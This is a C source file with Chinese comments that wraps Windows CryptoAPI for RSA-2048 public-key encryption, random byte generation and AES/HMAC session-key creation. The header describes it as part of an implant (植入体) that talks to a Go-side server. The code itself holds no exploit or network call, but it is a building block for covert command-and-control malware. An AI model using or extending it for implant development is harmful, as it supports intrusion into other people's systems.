/*
 * csdev :: rsa.c  --  CryptoAPI 封装 (RSA-2048 公钥加密 / CSPRNG / 会话密钥)
 * ==========================================================================
 * 依赖仅 ADVAPI32 (CryptAcquireContext / CryptImportKey / CryptEncrypt /
 * CryptGenRandom), 该 DLL 已在植入体导入表中, 不新增依赖。
 *
 * 填充方式为 PKCS#1 v1.5 (CryptEncrypt 默认), 与 Go 侧
 * crypto/rsa.DecryptPKCS1v15 兼容。
 * ==========================================================================
 */
#include <windows.h>
#include <wincrypt.h>

#include "crypto.h"

int rsa_encrypt_pub(const unsigned char *blob, unsigned int bloblen,
                    const unsigned char *in, unsigned int inlen,
                    unsigned char *out, unsigned int outcap, unsigned int *outlen)
{
    HCRYPTPROV hProv = 0;
    HCRYPTKEY  hKey  = 0;
    DWORD      len;
    unsigned int i;
    int        ok = 0;

    if (!blob || !in || !out || !outlen) return 0;
    if (outcap < 256) return 0;
    /* PKCS#1 v1.5: 明文上限 = 模长 - 11 = 245 */
    if (inlen == 0 || inlen > 245) return 0;

    if (!CryptAcquireContextA(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT))
        return 0;
    if (!CryptImportKey(hProv, blob, (DWORD)bloblen, 0, 0, &hKey))
        goto done;

    for (i = 0; i < inlen; i++) out[i] = in[i];
    len = inlen;

    if (!CryptEncrypt(hKey, 0, TRUE, 0, out, &len, outcap))
        goto done;

    /* 实测校正: CryptoAPI 输出的 RSA 密文为**小端**字节序, 而 PKCS#1 / Go /
     * .NET / OpenSSL 均按大端处理。不反转则对端解密报 NTE_BAD_DATA。
     * (2026-09 用 tools/rsa_probe.c + .NET RSA.Decrypt 验证: 反转后逐字节匹配) */
    {
        unsigned int k;
        for (k = 0; k < len / 2; k++) {
            unsigned char t = out[k];
            out[k] = out[len - 1 - k];
            out[len - 1 - k] = t;
        }
    }

    *outlen = (unsigned int)len;
    ok = 1;

done:
    if (hKey)  CryptDestroyKey(hKey);
    if (hProv) CryptReleaseContext(hProv, 0);
    return ok;
}

int csdev_random(unsigned char *buf, unsigned int len)
{
    HCRYPTPROV hProv = 0;
    int ok = 0;

    if (!buf || len == 0) return 0;
    if (!CryptAcquireContextA(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT))
        return 0;
    ok = CryptGenRandom(hProv, (DWORD)len, buf) ? 1 : 0;
    CryptReleaseContext(hProv, 0);
    return ok;
}

int csdev_make_session_keys(unsigned char aes_key[32], unsigned char hmac_key[32])
{
    /* 一次调用取 64 字节, 前半 aes_key 后半 hmac_key */
    unsigned char both[64];
    if (!csdev_random(both, sizeof(both))) return 0;
    {
        int i;
        for (i = 0; i < 32; i++) { aes_key[i] = both[i]; hmac_key[i] = both[32 + i]; }
    }
    {
        int i;
        for (i = 0; i < 64; i++) both[i] = 0;
    }
    return 1;
}
